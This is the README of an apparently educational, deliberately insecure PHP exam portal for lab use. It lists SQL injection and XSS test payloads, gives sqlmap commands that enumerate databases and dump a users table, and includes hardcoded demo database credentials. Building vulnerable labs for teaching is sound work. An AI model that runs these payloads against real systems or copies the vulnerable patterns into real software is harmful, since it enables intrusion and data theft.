# Overview

This is a deliberately insecure web application built in PHP for educational purposes. It demonstrates common web vulnerabilities:

* SQL Injection (String-based) – Admin login
* SQL Injection (Integer-based) – Student details via URL
* Reflected XSS – Search bar
* Stored XSS – Exam comments

Use only in a controlled lab environment (Kali Linux, `/var/www/html/`).

# Setup Instructions

Place all files in `/var/www/html/online_exam/`.

Import the database (MySQL root password may be required):

```bash
mysql -u root -p < setup.sql
```

If you use `sudo mysql` without password, run:

```bash
sudo mysql < setup.sql
```

Update `db.php` with the correct database credentials (already set to `sultan / sultan123`).

Start Apache and MySQL:

```bash
sudo systemctl start apache2
sudo systemctl start mysql
```

Access the portal at:

```text
http://localhost/online_exam/
```

# Vulnerable Pages

| Page                          | Vulnerability         | How to test                                   |
| ----------------------------- | --------------------- | --------------------------------------------- |
| `admin_login.php`             | String SQL injection  | `admin' OR '1'='1` as username + any password |
| `student.php?id=1`            | Integer SQL injection | `?id=1 OR 1=1` → shows all students           |
| `search.php?q=test`           | Reflected XSS         | `?q=<script>alert(1)</script>`                |
| `exam_comments.php?exam_id=1` | Stored XSS            | Post a comment: `<script>alert(1)</script>`   |

# Demonstrating SQLMap

String injection (login):

```bash
sqlmap -u "http://localhost/online_exam/admin_login.php?username=admin&password=test" --data="username=admin&password=test" -p username --dbms=mysql
```

Integer injection (student):

```bash
sqlmap -u ""http://localhost/online_exam/student.php?id=1"" --dbs --batch --flush-session
sqlmap -u ""http://localhost/online_exam/student.php?id=1"" -D sqli -T users --columns --batch --flush-session
sqlmap -u ""http://localhost/online_exam/student.php?id=1"" -D sqli -T users --dump --batch --flush-session

```

# Notes

* All code is intentionally insecure – do not deploy publicly.
* The database user `sultan / sultan123` is created in the setup script.
* For XSS stored, refresh the comments page after posting to see the script execute.

# File Structure

```text
/var/www/html/online_exam/
├── index.php
├── admin_login.php
├── student.php
├── search.php
├── exam_comments.php
├── db.php
├── setup.sql
└── README.md
```

Happy hacking! (Ethically, of course.)
